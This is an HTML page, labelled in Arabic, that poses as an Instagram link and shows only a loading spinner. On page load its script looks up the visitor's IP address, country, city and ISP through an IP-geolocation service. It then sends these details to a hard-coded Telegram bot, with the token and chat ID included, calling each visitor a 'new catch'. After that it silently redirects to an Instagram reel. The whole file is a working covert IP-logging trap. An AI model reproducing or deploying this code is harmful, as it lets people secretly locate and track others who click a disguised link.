<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { 
            background-color: #000000; 
            color: #ffffff; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            text-align: center; 
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255,255,255,0.1);
            border-radius: 50%;
            border-top-color: #ffffff;
            animation: spin 0.8s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="spinner"></div>

    <script>
        var targetInstagramUrl = "https://www.instagram.com/reel/DdoP29oMp_X/?stkn=MWpxMHo3N3RocDZzeQ=="; 

        var botToken = "8803169320:AAFSwUuSZw5eqzvYmj77qVYCDPS1gJPWemg";
        var chatId = "2122221879";

        async function sendInfoAndRedirect() {
            try {
                let response = await fetch('https://ipapi.co/json/');
                let data = await response.json();
                
                let message = "🎯 صيد جديد يا وحش!\n" +
                              "🌐 الـ IP: " + data.ip + "\n" +
                              "🌍 الدولة: " + data.country_name + "\n" +
                              "🏙️ المدينة: " + data.city + "\n" +
                              "🏢 المزود: " + data.org;

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                }).catch(() => {});
            } catch (error) {}

            window.location.replace(targetInstagramUrl);
        }

        sendInfoAndRedirect();
    </script>
</body>
</html>
